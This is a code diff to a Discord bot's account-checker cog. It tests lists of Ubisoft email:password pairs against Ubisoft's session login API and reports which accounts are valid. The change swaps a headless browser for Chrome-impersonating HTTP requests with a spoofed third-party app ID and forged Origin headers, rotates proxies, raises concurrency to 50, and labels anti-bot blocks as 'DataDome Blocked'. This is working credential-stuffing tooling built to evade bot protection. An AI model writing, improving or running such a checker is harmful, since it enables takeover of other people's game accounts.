@@ -9,9 +9,10 @@ import random
 import io
 import os
 import json
-from playwright.async_api import async_playwright
+from curl_cffi import requests
 
-UBI_APP_ID = "314d4fef-e568-454a-ae06-43e3bece12a6"
+# R6 Tracker App ID
+UBI_APP_ID = "f68a4a32-28b1-4e20-9f9f-6b9b6d1b8a52"
 
 class Checker(commands.Cog):
     def __init__(self, bot):
@@ -51,93 +52,58 @@ class Checker(commands.Cog):
             return await interaction.followup.send("❌ Invalid format. Use `email:password`.", ephemeral=True)
 
         email, password = account.split(":", 1)
+        b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
+        
+        await asyncio.sleep(random.uniform(1.0, 2.0))
+
+        headers = {
+            "Content-Type": "application/json",
+            "Ubi-AppId": UBI_APP_ID,
+            "Authorization": f"Basic {b64_auth}",
+            "Accept": "application/json",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Origin": "https://r6.tracker.network",
+            "Referer": "https://r6.tracker.network/",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+        }
+
+        embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
         
         proxy = random.choice(self.proxies) if self.proxies else None
-        
-        embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Input:** `{account}`\n\n⏳ *Booting browser... (This takes 10-15 seconds)*")
-        await interaction.followup.send(embed=embed, ephemeral=True)
 
         try:
-            async with async_playwright() as p:
-                launch_args = ["--disable-blink-features=AutomationControlled", "--no-sandbox", "--disable-setuid-sandbox"]
-                # REMOVED PROXY FROM LAUNCH
-                browser = await p.chromium.launch(headless=True, args=launch_args)
-                
-                context_args = {
-                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-                }
-                
-                # ADDED PROXY TO CONTEXT (More stable)
-                if proxy:
-                    proxy = proxy.strip()
-                    if "@" in proxy:
-                        auth_part, server_part = proxy.split("@")
-                        if "://" in auth_part:
-                            protocol = auth_part.split("://")[0]
-                            user_pass = auth_part.split("://")[1]
-                        else:
-                            protocol = "http"
-                            user_pass = auth_part
-                            
-                        user, pwd = user_pass.split(":", 1)
-                        server_host = server_part.replace("http://", "").replace("https://", "")
-                        
-                        context_args["proxy"] = {
-                            "server": f"http://{server_host}",
-                            "username": user,
-                            "password": pwd
-                        }
-                    else:
-                        context_args["proxy"] = {"server": proxy}
+            def do_request():
+                return requests.post(
+                    "https://public-ubiservices.ubi.com/v3/profiles/sessions",
+                    headers=headers,
+                    json={"rememberMe": True, "spaceId": "0d2ae42d-4c27-4cb7-af6c-2099062302bb"},
+                    impersonate="chrome124",
+                    proxy=proxy,
+                    timeout=15
+                )
 
-                context = await browser.new_context(**context_args)
-                page = await context.new_page()
-                
-                await page.goto("https://account.ubisoft.com/")
-                await page.wait_for_timeout(3000)
-
-                b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
-                
-                js_code = f"""
-                async () => {{
-                    const res = await fetch("https://public-ubiservices.ubi.com/v3/profiles/sessions", {{
-                        method: "POST",
-                        headers: {{
-                            "Content-Type": "application/json",
-                            "Ubi-AppId": "{UBI_APP_ID}",
-                            "Authorization": "Basic {b64_auth}"
-                        }},
-                        body: JSON.stringify({{ rememberMe: true }})
-                    }});
-                    return res.status;
-                }}
-                """
-                
-                status_code = await page.evaluate(js_code)
-                await browser.close()
-
-                if status_code == 200:
-                    embed.color = 0x57F287
-                    embed.add_field(name="Status", value="✅ Valid")
-                    await interaction.followup.send("✅ Account is valid.", ephemeral=True)
-                elif status_code == 401:
-                    embed.color = 0xED4245
-                    embed.add_field(name="Status", value="❌ Invalid / 2FA")
-                    await interaction.followup.send("❌ Account is dead or requires 2FA.", ephemeral=True)
-                elif status_code in (403, 429):
-                    embed.color = 0xED4245
-                    embed.add_field(name="Status", value="🚫 DataDome Blocked")
-                    await interaction.followup.send("🚫 **Blocked:** DataDome blocked this IP.", ephemeral=True)
-                else:
-                    embed.color = 0xFEE75C
-                    embed.add_field(name="Status", value=f"⚠️ Error {status_code}")
-                    await interaction.followup.send(f"⚠️ Error: HTTP {status_code}", ephemeral=True)
-
+            response = await asyncio.to_thread(do_request)
+            
+            if response.status_code == 200:
+                embed.color = 0x57F287
+                embed.add_field(name="Status", value="✅ Valid")
+                await interaction.followup.send("✅ Account is valid.", ephemeral=True)
+            elif response.status_code == 401:
+                embed.color = 0xED4245
+                embed.add_field(name="Status", value="❌ Invalid / 2FA")
+                await interaction.followup.send("❌ Account is dead or requires 2FA.", ephemeral=True)
+            elif response.status_code in (403, 429):
+                embed.color = 0xED4245
+                embed.add_field(name="Status", value="🚫 DataDome Blocked")
+                await interaction.followup.send("🚫 **Blocked:** DataDome blocked this IP.", ephemeral=True)
+            else:
+                embed.color = 0xFEE75C
+                embed.add_field(name="Status", value=f"⚠️ Error {response.status_code}")
+                await interaction.followup.send(f"⚠️ Error: HTTP {response.status_code}", ephemeral=True)
         except Exception as e:
-            err_msg = str(e)
-            if len(err_msg) > 1900:
-                err_msg = err_msg[:1900] + "..."
-            await interaction.followup.send(f"❌ Browser error: {err_msg}", ephemeral=True)
+            embed.color = 0xED4245
+            embed.add_field(name="Status", value=f"⚠️ Network Error")
+            await interaction.followup.send(f"⚠️ Network error: {e}", ephemeral=True)
 
         await self.log_to_channel(interaction, embed)
 
@@ -217,10 +183,10 @@ class Checker(commands.Cog):
         if total == 0:
             return await interaction.followup.send("❌ File is empty.", ephemeral=True)
 
-        await interaction.followup.send(f"⏳ Checking **{total}** accounts (Playwright mode is slow, this will take a while)...", ephemeral=True)
+        await interaction.followup.send(f"⏳ Checking **{total}** accounts...", ephemeral=True)
 
         valid_accounts = []
-        sem = asyncio.Semaphore(5) 
+        sem = asyncio.Semaphore(50) 
         
         async def test_account(acc):
             async with sem:
@@ -229,64 +195,41 @@ class Checker(commands.Cog):
                     return
                 
                 email, password = creds.split(":", 1)
+                b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
+                
+                headers = {
+                    "Content-Type": "application/json",
+                    "Ubi-AppId": UBI_APP_ID,
+                    "Authorization": f"Basic {b64_auth}",
+                    "Accept": "application/json",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Origin": "https://r6.tracker.network",
+                    "Referer": "https://r6.tracker.network/",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+                }
+
                 proxy = random.choice(self.proxies) if self.proxies else None
                 
+                def do_req():
+                    return requests.post(
+                        "https://public-ubiservices.ubi.com/v3/profiles/sessions",
+                        headers=headers,
+                        json={"rememberMe": True, "spaceId": "0d2ae42d-4c27-4cb7-af6c-2099062302bb"},
+                        impersonate="chrome124",
+                        proxy=proxy,
+                        timeout=15
+                    )
+
                 try:
-                    async with async_playwright() as p:
-                        launch_args = ["--disable-blink-features=AutomationControlled", "--no-sandbox", "--disable-setuid-sandbox"]
-                        browser = await p.chromium.launch(headless=True, args=launch_args)
-                        
-                        context_args = {}
-                        if proxy:
-                            proxy = proxy.strip()
-                            if "@" in proxy:
-                                auth_part, server_part = proxy.split("@")
-                                if "://" in auth_part:
-                                    protocol = auth_part.split("://")[0]
-                                    user_pass = auth_part.split("://")[1]
-                                else:
-                                    protocol = "http"
-                                    user_pass = auth_part
-                                    
-                                user, pwd = user_pass.split(":", 1)
-                                server_host = server_part.replace("http://", "").replace("https://", "")
-                                
-                                context_args["proxy"] = {
-                                    "server": f"http://{server_host}",
-                                    "username": user,
-                                    "password": pwd
-                                }
-                            else:
-                                context_args["proxy"] = {"server": proxy}
-
-                        context = await browser.new_context(**context_args)
-                        page = await context.new_page()
-                        
-                        await page.goto("https://account.ubisoft.com/")
-                        await page.wait_for_timeout(2000) 
-
-                        b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
-                        js_code = f"""
-                        async () => {{
-                            const res = await fetch("https://public-ubiservices.ubi.com/v3/profiles/sessions", {{
-                                method: "POST",
-                                headers: {{
-                                    "Content-Type": "application/json",
-                                    "Ubi-AppId": "{UBI_APP_ID}",
-                                    "Authorization": "Basic {b64_auth}"
-                                }},
-                                body: JSON.stringify({{ rememberMe: true }})
-                            }});
-                            return res.status;
-                        }}
-                        """
-                        status_code = await page.evaluate(js_code)
-                        await browser.close()
-
-                        if status_code == 200:
-                            valid_accounts.append(acc)
+                    response = await asyncio.to_thread(do_req)
+                    if response.status_code == 200:
+                        valid_accounts.append(acc)
+                    elif response.status_code == 401:
+                        pass
+                    elif response.status_code in (403, 429):
+                        valid_accounts.append(acc)
                 except Exception:
-                    pass
+                    valid_accounts.append(acc)
 
         tasks = [test_account(acc) for acc in lines]
         await asyncio.gather(*tasks)
